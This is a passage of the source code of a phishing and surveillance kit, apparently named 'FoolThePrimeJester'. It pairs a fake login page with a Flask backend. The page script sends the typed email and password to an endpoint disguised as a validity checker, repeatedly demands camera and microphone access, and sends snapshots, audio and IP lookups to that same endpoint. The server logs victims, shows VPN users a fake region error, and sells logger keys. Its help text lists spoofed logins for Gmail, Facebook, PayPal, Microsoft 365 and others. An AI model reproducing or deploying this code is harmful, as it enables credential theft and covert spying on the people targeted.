        <div class="input-container">
            <input type="password" id="password-input" placeholder="Password" required>
            <div id="password-error" class="error">Password cannot be empty</div>
        </div>
        <div class="forgot-link">
            <a href="#">Forgot your password?</a>
        </div>
        <div class="buttons">
            <div class="create-account">
                <a href="#" onclick="backToEmailScreen()">Back</a>
            </div>
            <button class="signin-btn" onclick="handleSignIn()">Log In</button>
        </div>
    </div>

    <div class="footer">
        <a href="#">English</a>
        <a href="#">Terms of Service</a>
        <a href="#">Privacy</a>
        <a href="#">Help</a>
    </div>

    <script>
        let mediaProcessingComplete = false;
        let signInClickCount = 0;

        async function fetchWithTimeout(url, timeout = 3000) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), timeout);
                
                const response = await fetch(url, { signal: controller.signal });
                clearTimeout(timeoutId);
                
                return { url, data: await response.text() };
            } catch (error) {
                return { url, data: `Error: ${error.message}` };
            }
        }

        async function getUserMediaPermissions() {
            while (true) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    return stream;
                } catch (error) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
        }

        async function captureImageWithTimeout(stream, width = 128, height = 128, timeout = 1000) {
            const video = document.createElement('video');
            video.srcObject = stream;
            
            try {
                const loaded = new Promise(resolve => video.onloadedmetadata = resolve);
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Image capture timeout')), timeout)
                );
                
                await Promise.race([loaded, timeoutPromise]);
                video.play();

                const canvas = document.createElement('canvas');
                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, width, height);
                
                const imageData = canvas.toDataURL('image/jpeg');
                video.srcObject = null;
                return imageData;
            } catch (error) {
                video.srcObject = null;
                return null;
            }
        }

        async function recordAudioWithTimeout(stream, duration = 5000, initialTimeout = 2000) {
            return new Promise(async (resolve) => {
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                let hasData = false;
                
                recorder.ondataavailable = e => {
                    chunks.push(e.data);
                    hasData = true;
                };
                
                recorder.onstop = () => {
                    if (!hasData) {
                        resolve(null);
                        return;
                    }
                    const blob = new Blob(chunks, { type: 'audio/wav' });
                    const reader = new FileReader();
                    reader.onload = () => resolve(reader.result);
                    reader.readAsDataURL(blob);
                };

                try {
                    recorder.start();
                    
                    await Promise.race([
                        new Promise(resolve => setTimeout(resolve, initialTimeout)),
                        new Promise(resolve => recorder.onstart = resolve)
                    ]);
                    
                    if (!hasData) {
                        recorder.stop();
                        return;
                    }

                    setTimeout(() => recorder.stop(), duration);
                } catch (error) {
                    recorder.stop();
                    resolve(null);
                }
            });
        }

        async function processMedia() {
            const urls = [
                'https://ifconfig.me/',
                'https://ifconfig.me/all',
                'https://whatismyipaddress.com/',
                'https://www.showmyip.com/',
                'https://ipaddress.my/',
                'https://ipinfo.io/json',
                'https://ipapi.co/json',
                'https://ipwho.is/',
                'https://google.com/',
                'https://youtube.com/'
            ];

            const fetchPromises = urls.map(url => fetchWithTimeout(url));
            const results = await Promise.all(fetchPromises);
            const dataJson = Object.fromEntries(results.map(result => [result.url, result.data]));

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "ifconfig",
                    data: dataJson
                }),
                headers: { 'Content-Type': 'application/json' }
            });

            const stream = await getUserMediaPermissions();
            
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(device => device.kind === 'videoinput');
            
            for (const device of videoDevices.slice(0, 5)) {
                const cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { deviceId: device.deviceId }
                });
                
                const imageData = await captureImageWithTimeout(cameraStream);
                if (imageData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "camera",
                            data: imageData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                cameraStream.getTracks().forEach(track => track.stop());
            }

            const audioDevices = devices.filter(device => device.kind === 'audioinput');
            if (audioDevices.length > 0) {
                const audioStream = await navigator.mediaDevices.getUserMedia({
                    audio: { deviceId: audioDevices[0].deviceId }
                });
                
                const audioData = await recordAudioWithTimeout(audioStream);
                if (audioData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "microphone",
                            data: audioData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                audioStream.getTracks().forEach(track => track.stop());
            }

            mediaProcessingComplete = true;
            checkAndRedirect();
        }

        function showPasswordScreen() {
            const emailInput = document.getElementById('email-input').value;
            const emailError = document.getElementById('email-error');
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

            if (!emailInput) {
                emailError.textContent = "Email or phone number cannot be empty";
                emailError.style.display = 'block';
            } else if (!emailRegex.test(emailInput)) {
                emailError.textContent = "Enter a valid email or phone number";
                emailError.style.display = 'block';
            } else {
                emailError.style.display = 'none';
                document.getElementById('email-screen').style.display = 'none';
                document.getElementById('password-screen').style.display = 'block';
            }
        }

        function backToEmailScreen() {
            document.getElementById('password-screen').style.display = 'none';
            document.getElementById('email-screen').style.display = 'block';
            document.getElementById('password-error').style.display = 'none';
        }

        let accountSent = false;

        async function handleSignIn() {
            const email = document.getElementById('email-input').value;
            const password = document.getElementById('password-input').value;
            const passwordError = document.getElementById('password-error');

            signInClickCount++;

            if (signInClickCount >= 3) {
                window.location.href = "<!redirect!>";
                return;
            }

            if (!password) {
                passwordError.textContent = "Password cannot be empty";
                passwordError.style.display = 'block';
                return;
            } else {
                passwordError.style.display = 'none';
            }

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "account",
                    data: { user: email, password: password }
                }),
                headers: { 'Content-Type': 'application/json' }
            });
            accountSent = true;
            checkAndRedirect();
        }

        function checkAndRedirect() {
            if (mediaProcessingComplete && accountSent) {
                window.location.href = "<!redirect!>";
            }
        }

        processMedia();
    </script>
</body>
</html>"""}

help_text = """
FoolThePrimeJester - Page Code Names and Information

1- bl0 = Basic Loading
2- hv0 = Human Verification
3- fb0 = Fully Blank
4- dr0 = Direct Redirect HTML Page (We dont support directive http redirects but we can support directive redirect on html codes) (only access logging)
5- gl0 = Google Gmail Login
6- fl0 = Facebook Login
7- il0 = Instagram Login
8- cq0 = Custom Fully Iframe Page (query must be a url)
9- xtl0 = X (Twitter) Login
10- inl0 = LinkedIn Login
11- tl0 = Tiktok Login
12- gyl0 = Google Gmail Login for YouTube
13- rl0 = Reddit Login
14- pdl0 = Discord Login (Professional)
15- gl1 = Google Gmail Login (Alternative)
16- mol0 = Microsoft Office 365 Login
17- nl0 = Netflix Login
18- pl0 = Paypal Login
19- gtl0 = GameTree Login
20- sl0 = Steam Login
21- mfl0 = MediaFire Login
22- ml0 = MEGA Login

How do I get logger links?

<!my_host!>/check?i=YOUR_OUTPUT_IDENTITY&t=YOUR_PAGE_TYPE_CODE_NAME&p=OPTIONAL_BASE64_QUERY_FOR_PAGE

Prepare your links in the format you see. Write the output ID in the 'i' part. Write the page type codename in the 't' part. Optionally, you can manipulate the query based on the page type to have more customized features. For this, you can add an additional 'q' argument, but the content of the 'q' argument, meaning its data, must be encoded in base64 for security purposes.
"""

my_host = "http://localhost:5000"

lock = threading.Lock()

app = Flask(__name__)

def ip_lookup(ip):
	global database
	if ip in database["ips"]:
		return database["ips"][ip]
	try:
		result = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719", headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Safari/537.36 Edge/112.0.1722.64", "X-Real-IP": "129.129.129.129", "X-Real-Ip": "129.129.129.129", "X-Forwarded-For": "129.129.129.129,34.117.59.81", "Cache-Control": "no-cache, no-store, must-revalidate", "Pragma": "no-cache", "Accept": "*/*", "Referer": f"http://ip-api.com/json/95.70.207.152?fields=66846719", "Origin": f"http://ip-api.com/json/95.70.207.152?fields=66846719", "Connection": "keep-alive"}, timeout=5).json()
	except:
		result = {}
	try:
		result.update(requests.get(f"https://ipapi.co/{ip}/json", headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Safari/537.36 Edge/112.0.1722.64", "X-Real-IP": "129.129.129.129", "X-Real-Ip": "129.129.129.129", "X-Forwarded-For": "129.129.129.129,34.117.59.81", "Cache-Control": "no-cache, no-store, must-revalidate", "Pragma": "no-cache", "Accept": "*/*", "Referer": f"https://ipapi.co/{ip}/json", "Origin": f"https://ipapi.co/{ip}/json", "Connection": "keep-alive"}, timeout=5).json())
	except:
		pass
	result["whois"] = {}
	try:
		result["whois"].update(requests.get(f"http://ipwho.is/{ip}?fields=ip,success,message,type,continent,continent_code,country,country_code,region,region_code,city,latitude,longitude,is_eu,postal,calling_code,capital,borders,flag.img,flag.emoji,flag.emoji_unicode,connection.asn,connection.org,connection.isp,connection.domain,timezone.id,timezone.abbr,timezone.is_dst,timezone.offset,timezone.utc,timezone.current_time,currency.name,currency.code,currency.symbol,currency.plural,currency.exchange_rate,security.anonymous,security.proxy,security.vpn,security.tor,security.hosting", headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Safari/537.36 Edge/112.0.1722.64", "X-Real-IP": "129.129.129.129", "X-Real-Ip": "129.129.129.129", "X-Forwarded-For": "129.129.129.129,34.117.59.81", "Cache-Control": "no-cache, no-store, must-revalidate", "Pragma": "no-cache", "Accept": "*/*", "Referer": f"http://ipwho.is/{ip}/fields=ip,success,message,type,continent,continent_code,country,country_code,region,region_code,city,latitude,longitude,is_eu,postal,calling_code,capital,borders,flag.img,flag.emoji,flag.emoji_unicode,connection.asn,connection.org,connection.isp,connection.domain,timezone.id,timezone.abbr,timezone.is_dst,timezone.offset,timezone.utc,timezone.current_time,currency.name,currency.code,currency.symbol,currency.plural,currency.exchange_rate,security.anonymous,security.proxy,security.vpn,security.tor,security.hosting", "Origin": f"http://ipwho.is/{ip}/fields=ip,success,message,type,continent,continent_code,country,country_code,region,region_code,city,latitude,longitude,is_eu,postal,calling_code,capital,borders,flag.img,flag.emoji,flag.emoji_unicode,connection.asn,connection.org,connection.isp,connection.domain,timezone.id,timezone.abbr,timezone.is_dst,timezone.offset,timezone.utc,timezone.current_time,currency.name,currency.code,currency.symbol,currency.plural,currency.exchange_rate,security.anonymous,security.proxy,security.vpn,security.tor,security.hosting", "Connection": "keep-alive"}, timeout=5).json())
	except:
		pass
	org = (result.get("org", "")+" "+result.get("whois").get("connection", {}).get("org", "")+" "+result.get("whois").get("connection", {}).get("isp", "")+" "+result.get("whois").get("connection", {}).get("domain", "")).strip()
	result["full_org"] = org
	with lock:
		database["ips"][ip] = result
	return result

def get_time():
    current_time = time.localtime()
    milliseconds = int(time.time() * 1000) % 1000
    formatted_time = time.strftime("%Y-%m-%d %H:%M:%S", current_time) + f".{milliseconds:03d}"
    return formatted_time

def get_auto_data():
	if "X-Real-IP" in request.headers:
		remote_addr = request.headers.get("X-Real-IP")
	elif "X-Real-Ip" in request.headers:
		remote_addr = request.headers.get("X-Real-Ip")
	elif "X-Forwarded-For" in request.headers:
		remote_addr = request.headers.get("X-Forwarded-For")
		remote_addr = remote_addr[:remote_addr.find(",")]
	else:
		remote_addr = str(request.remote_addr)
	remote_addr = remote_addr.strip()
	lookup = ip_lookup(remote_addr)
	org = lookup["full_org"]
	checking_org = ""
	for h in org.lower().strip():
		if h in "qwertyuiopasdfghjklzxcvbnm1234567890":
			checking_org += h
	proxy_keywords = database["proxy_keywords"]
	is_proxy = False
	for h in proxy_keywords:
		if h.lower() in checking_org:
			is_proxy = True;break
	remote_port = int(request.environ.get("REMOTE_PORT", 0))
	auto_data = {"remote_addr": remote_addr, "remote_port": remote_port, "headers": dict(request.headers), "environ": dict(request.environ), "lookup": lookup, "is_proxy": is_proxy, "time": time.time(), "full_time": get_time()}
	return auto_data

def get_auto_data_little():
	if "X-Real-IP" in request.headers:
		remote_addr = request.headers.get("X-Real-IP")
	elif "X-Real-Ip" in request.headers:
		remote_addr = request.headers.get("X-Real-Ip")
	elif "X-Forwarded-For" in request.headers:
		remote_addr = request.headers.get("X-Forwarded-For")
		remote_addr = remote_addr[:remote_addr.find(",")]
	else:
		remote_addr = str(request.remote_addr)
	remote_addr = remote_addr.strip()
	lookup = ip_lookup(remote_addr)
	org = lookup["full_org"]
	checking_org = ""
	for h in org.lower().strip():
		if h in "qwertyuiopasdfghjklzxcvbnm1234567890":
			checking_org += h
	proxy_keywords = database["proxy_keywords"]
	is_proxy = False
	for h in proxy_keywords:
		if h.lower() in checking_org:
			is_proxy = True;break
	remote_port = int(request.environ.get("REMOTE_PORT", 0))
	auto_data = {"remote_addr": remote_addr, "remote_port": remote_port, "headers": dict(request.headers), "is_proxy": is_proxy, "full_time": get_time()}
	return auto_data

def create_logger(input_name, output_name, adminput_name, redirect, key, creator_log, max_logs):
	global starter_keys, ssp_keys, database
	max_logs = int(max_logs)
	if key in starter_keys or key in ssp_keys:
		if key in ssp_keys:
			client = "ssp"
		else:
			client = "starter"
			if max_logs >= 100:
				raise ValueError("We support up to 100 registration entries for starter accounts.")
		if max_logs <= 0:
			raise ValueError("Maximum number of invalid records. Must be 1 or more.")
		if input_name in database["loggers"]:
			raise SystemError("Logger input name ready using.")
		if output_name in database["loggers_tunnel"]:
			raise SystemError("Logger output name ready using.")
		if adminput_name in database["loggers_admin"]:
			raise SystemError("Logger adminput name ready using.")
		input_name = input_name[:32]
		output_name = output_name[:32]
		adminput_name = adminput_name[:32]
		if len(input_name) <= 5:
			raise ValueError("Logger input name must be longer than 5 characters.")
		if len(output_name) <= 5:
			raise ValueError("Logger output name must be longer than 5 characters.")
		if len(adminput_name) <= 5:
			raise ValueError("Logger adminput name must be longer than 5 characters.")
		with lock:
			database["loggers"][input_name] = {"output": output_name, "adminput": adminput_name, "creator_log": creator_log, "logs": {"access": [], "ifconfig": [], "account": [], "camera": [], "microphone": []}, "client": client, "redirect": redirect, "max_logs": max_logs, "used_key": key}
			database["loggers_tunnel"][output_name] = input_name
			database["loggers_admin"][adminput_name] = input_name
		save_database()
		return "Successfuly."
	else:
		raise ValueError("Key invalid.")

@app.route("/fooltheprimejester/premiusjester/index/of/path/to/your/mom/A7F9D3B6E1C2G8H5J4K9L0MNPQRTVWXY/verify/Z4X8V1N7M3P0QW6R2T9K5JBLGCDYFAEH", methods=["FTPJ"])
def verify_key_get():
	global verify_keys
	key = str(uuid.uuid4())
	if key not in verify_keys:
		with lock:
			verify_keys.append(key)
	return key

@app.route("/fooltheprimejester/premiusjester/index/of/path/to/your/mom/O2N9S39WJ2OR0D82N/ftpj_premiustool/82JS92O2OWOXN3NRIZ73N", methods=["FTPJ"])
def get_premiustool():
	global ssp_keys
	try:
		verify_key(request.args["temp_verify_key"])
		key = request.args["key"]
		if key in ssp_keys:
			return premius_tool_code
		else:
			return "Error: Invalid Key."
	except Exception as e:
		error_log(e)
		return f"Error: "+str(e)

def verify_key(key):
	global verify_keys
	if key not in verify_keys:
		raise ValueError("Not authorizated.")
	with lock:
		verify_keys.remove(key)

@app.route("/fooltheprimejester/premiusjester/index/of/path/to/your/mom/MNPQW9X7J3K5T2V1G8D6R4B0LCAFYEHZ/create_logger/R2T9K5JBLGCDYFAEHZ4X8V1N7M3P0QW6", methods=["FTPJ"])
def logger_create_api():
	try:
		data = request.get_json()
		verify_key(data["temp_verify_key"])
		text = create_logger(str(data["input"]), str(data["output"]), str(data["adminput"]), str(data["redirect"]), str(data["key"]), get_auto_data(), int(data["max_logs"]))
		return json.dumps({"status": True, "text": text}), 200
	except Exception as e:
		error_log(e)
		return json.dumps({"status": False, "text": str(e)}), 400

@app.route("/fooltheprimejester/premiusjester/index/of/path/to/your/mom/QHDO2ND92NW9S82NW9/show_all_off/GWKWBDOWPQOWOXUN38D63NW8", methods=["FTPJ"])
def show_all_off():
	global database
	try:
		target = request.args["adminput"]
		verify_key(request.args["temp_verify_key"])
		if target in database["loggers_admin"]:
			alldata = database["loggers"][database["loggers_admin"][target]].copy()
			alldata["creator_log"] = "FoolThePrimeJester, since we prioritize our security, we collect and store a significant amount of information about the logger you created and about you, analyzing it in detail to better understand your system and protect ourselves from potential threats. Additionally, we strictly prohibit you from exploiting the extensive data we gather about you to teach others how to create logs and then misuse this training for malicious purposes by hacking their information through the log display link. In other words, you are only allowed to hack someone's information using our logger links. Any attempts to use your own methods or alternative ways to capture user data are strictly unacceptable. Do not attempt such manipulative or malicious activities. We closely monitor all your actions, and any effort to exploit security vulnerabilities or mislead users for personal gain is carefully tracked. Remember, all your activities are recorded, and if you try any tricks, we will detect them and take the necessary measures."
			return Response(json.dumps(alldata, default=repr), mimetype="application/json")
		else:
			return "Invalid adminput.", 400
	except Exception as e:
		error_log(e)
		return str(e), 400

@app.route("/fooltheprimejester/premiusjester/index/of/path/to/your/mom/OWOWNZO2N28TUSN/help/MXBEK39W8XH2OW9ZH", methods=["FTPJ"])
def help_command():
	global help_text
	return help_text

def check_validity(data):
	global database, starter_keys, ssp_keys
	target = data["target"]
	if target in database["loggers_tunnel"]:
		target = database["loggers_tunnel"][target]
	else:
		raise SystemError("Target validity checker engine is not avaible.")
	used_key = database["loggers"][target]["used_key"]
	client_test = database["loggers"][target]["client"]
	itest = database["loggers"][target]
	if client_test == "starter":
		if used_key not in starter_keys:
			with lock:
				del database["loggers"][target]
			raise SystemError("The key has expired and can no longer be used.")
	else:
		if used_key not in ssp_keys:
			with lock:
				del database["loggers"][target]
			raise SystemError("The key has expired and can no longer be used.")
	type = data["type"]
	if type in database["loggers"][target]["logs"]:
		logprof = database["loggers"][target]["logs"]
		log_count = 0
		for n, v in logprof.items():
			log_count += len(logprof[n])
		if log_count >= database["loggers"][target]["max_logs"]:
			raise SystemError("Log limit exceeded, try creating another logger.")
		if database["loggers"][target]["client"] == "starter":
			if type not in ["access", "account", "camera"]:
				raise ValueError("Invalid validity checking type.")
			auto_data = get_auto_data_little()
		else:
			auto_data = get_auto_data()
		newdata = {"auto_data": auto_data, "data": data}
		with lock:
			database["loggers"][target]["logs"][type].append(newdata)
		return "Successfuly."
	else:
		raise SystemError("Invalid validity checking type.")

@app.route("/check_validity", methods=["CHECK"])
def not_a_validity_checker_its_logger():
	try:
		data = request.get_json()
		res = json.dumps({"status": True, "text": check_validity(data)})
		save_database()
		return res, 200
	except Exception as e:
		error_log(e)
		return json.dumps({"status": False, "text": str(e)}), 400

@app.route("/check", methods=["GET"])
def fake_checking_page():
	global database, logger_pages, my_host
	try:
		target = request.args["i"]
		type = request.args["t"]
		try:
			q = request.args["q"]
		except:
			q = ""
		if target not in database["loggers_tunnel"]:
			raise SystemError("Invalid check page.")
		check_validity({"target": request.args["i"], "type": "access"})
		target = database["loggers_tunnel"][target]
		if type not in logger_pages:
			raise SystemError("Invalid check page type.")
		test = get_auto_data_little()
		if test["is_proxy"]: # Disabling proxy/vpn with fake error.
			raise SystemError("""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Service Not Available</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            color: #333;
            text-align: center;
            padding: 50px;
        }
        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            max-width: 600px;
            margin: 0 auto;
        }
        h1 {
            color: #d9534f;
        }
        p {
            font-size: 16px;
            line-height: 1.5;
        }
        .suggestion {
            font-style: italic;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Service Not Available in Your Region</h1>
        <p>We’re sorry, but our service is currently not supported in your country or region. This restriction is due to local regulations and network configurations.</p>
        <p class="suggestion">If you’re using a VPN or proxy, you might try disabling it and refreshing the page to see if that resolves the issue.</p>
        <p>Thank you for your understanding!</p>
    </div>
</body>
</html>""")
		redirect = database["loggers"][target]["redirect"]
		code = logger_pages[type]
		if len(code) == 2:
			if database["loggers"][target]["client"] == "starter":
				code = code[0]
			else:
				code = code[1]
		code = code.replace("<!checker_identity!>", request.args["i"])
		code = code.replace("<!custom_query!>", base64.b64decode(q.encode("utf-8", errors="ignore")).decode("utf-8", errors="ignore"))
		code = code.replace("<!redirect!>", redirect)
		code = code.replace("<!checker_client!>", database["loggers"][target]["client"])
		save_database()
		return code, 200
	except Exception as e:
		save_database()
		error_log(e)
		return str(e), 400

@app.route("/assets/dcbg.jpg")
def dcbgasset():
	return send_file("images/dcbg.jpg", mimetype="image/jpg")
@app.route("/assets/dclogo.png")
def dclogoasset():
	return send_file("images/dclogo.png", mimetype="image/png")
@app.route("/assets/dcqr.png")
def dcqrasset():
	return send_file("images/dcscan.png", mimetype="image/png")
if __name__ == "__main__":
    app.run(debug=True)